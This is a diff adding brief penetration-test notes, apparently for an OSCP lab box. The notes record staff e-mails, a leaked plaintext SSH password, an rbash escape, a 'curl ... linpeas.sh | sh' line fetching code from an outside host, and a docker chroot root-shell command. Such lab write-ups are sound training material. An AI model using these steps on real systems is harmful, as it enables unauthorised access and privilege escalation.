@@ -1,0 +1,46 @@
+# 1 found domain user info from contact page
+Administrator:
+Name: Walter
+E-mail: walter@oscp.thinc.local
+Year of birth: 1982
+
+Developer:
+Name: Alfred
+E-mail: alfred@oscp.thinc.local
+Year of birth: 1988
+
+Web Developer:
+Name: Cory
+E-mail: cory@oscp.thinc.local
+Year of birth: 1985
+
+Writer:
+Name: Jasmine
+E-mail: jasmine@oscp.thinc.local
+Year of birth: 1983
+
+# 2 found sus directory
+/passwords
+
+# 3 found alfred credentials with his year of birth in /alfred-pas.html
+username: alfred
+password: IHopeThisDoesNotExpire
+Additional Info: oscp.thinc.local	SSH server access.
+
+# 4 login ssh as alfred and excape rbash shell
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" alfred@$IP -t "bash --noprofile"
+compgen -c 
+
+# 5 run linpeas.sh
+curl http://192.168.119.191:9000/linpeas.sh | sh
+
+# 6 found PE vector
+uid=1000(alfred) gid=1000(alfred) groups=1000(alfred),4(adm),24(cdrom),30(dip),46(plugdev),110(lpadmin),111(sambashare),122(docker)
+/var/run/docker.sock is writable
+
+# 7 found releated info but we don't have write permission 
+# https://www.youtube.com/watch?v=MnUtHSpcdLQ
+
+# 8 get root shell
+# https://gtfobins.github.io/gtfobins/docker/
+docker run -v /:/mnt --rm -it alpine chroot /mnt bash
